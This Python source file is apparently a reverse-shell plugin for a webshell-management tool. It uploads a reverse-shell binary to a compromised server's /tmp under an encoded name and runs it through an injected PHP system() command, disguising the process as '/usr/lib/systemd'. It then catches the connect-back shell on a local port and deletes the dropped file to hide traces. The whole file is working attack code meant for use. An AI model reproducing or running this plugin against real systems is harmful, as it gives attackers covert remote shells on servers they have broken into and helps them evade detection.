from libs.reverse_client_bash import main as bind
from base64 import b64encode
from os import getcwd, path
from threading import Thread

from libs.config import alias, color, is_windows
from libs.myapp import delay_send, send
from webshell_plugins.upload import run as upload


@alias(True, func_alias="rs", l="lhost", p="port", f="fakename")
def run(lhost: str, port: int, fakename: str = "/usr/lib/systemd"):
    """
    shell

    Bind a port and wait for target connect back to get a full shell.
    """
    if (is_windows(False) or is_windows()):
        print(color.red(f"Only for both system is linux."))
        return False
    try:
        port = int(port)
    except ValueError:
        port = 23333
    filename = b64encode(f"{lhost}-{port}".encode()).decode()
    print(color.yellow(f"Waring: You are using a testing command...."))
    print(color.yellow(f"        Please make sure Port {port} open...."))
    if not upload(path.join(getcwd(), "libs", "reverse_server_light"), "/tmp/%s" % filename, True):
        return
    t = Thread(target=delay_send, args=(2, f"system('cd /tmp && chmod +x {filename} && ./{filename} {fakename}');"))
    t.setDaemon(True)
    t.start()
    print(f"Bind port {color.yellow(str(port))}...\n")
    if (not bind(port)):
        print(color.red(f"Bind port error."))
    send(f"unlink('/tmp/{filename}');")
